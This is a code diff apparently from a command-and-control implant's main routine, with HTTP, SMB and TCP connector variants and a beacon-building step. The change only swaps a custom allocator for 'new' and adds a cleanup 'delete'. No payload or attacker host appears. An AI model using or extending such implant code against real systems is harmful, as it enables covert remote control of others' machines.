@@ -17,11 +17,8 @@ void AgentMain()
 	if ( !ApiLoad() ) 
 		return;
 
-	g_Agent  = (Agent*) MemAllocLocal(sizeof(Agent));
-	*g_Agent = Agent();
-
-	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
-	*g_Connector = ConnectorHTTP();
+	g_Agent = new Agent();
+	g_Connector = new ConnectorHTTP();
 
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
@@ -29,8 +26,7 @@ void AgentMain()
 	if ( !g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize) )
 		return;
 
-	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
-	*packerOut = Packer();
+	Packer* packerOut = new Packer();
 	packerOut->Pack32(0);
 
 	do {
@@ -91,11 +87,8 @@ void AgentMain()
 	if (!ApiLoad())
 		return;
 
-	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
-	*g_Agent = Agent();
-
-	g_Connector = (ConnectorSMB*)MemAllocLocal(sizeof(ConnectorSMB));
-	*g_Connector = ConnectorSMB();
+	g_Agent = new Agent();
+	g_Connector = new ConnectorSMB();
 
 	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
 		return;
@@ -103,8 +96,7 @@ void AgentMain()
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
 
-	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
-	*packerOut = Packer();
+	Packer* packerOut = new Packer();
 	packerOut->Pack32(0);
 
 	do {
@@ -178,11 +170,8 @@ void AgentMain()
 	if (!ApiLoad())
 		return;
 
-	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
-	*g_Agent = Agent();
-
-	g_Connector = (ConnectorTCP*)MemAllocLocal(sizeof(ConnectorTCP));
-	*g_Connector = ConnectorTCP();
+	g_Agent = new Agent();
+	g_Connector = new ConnectorTCP();
 
 	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
 		return;
@@ -190,8 +179,7 @@ void AgentMain()
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
 
-	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
-	*packerOut = Packer();
+	Packer* packerOut = new Packer();
 	packerOut->Pack32(0);
 
 	do {
@@ -241,6 +229,8 @@ void AgentMain()
 		g_Connector->Disconnect();
 
 	} while (g_Agent->IsActive());
+	
+	delete packerOut;
 
 	MemFreeLocal((LPVOID*)&beat, beatSize);
 
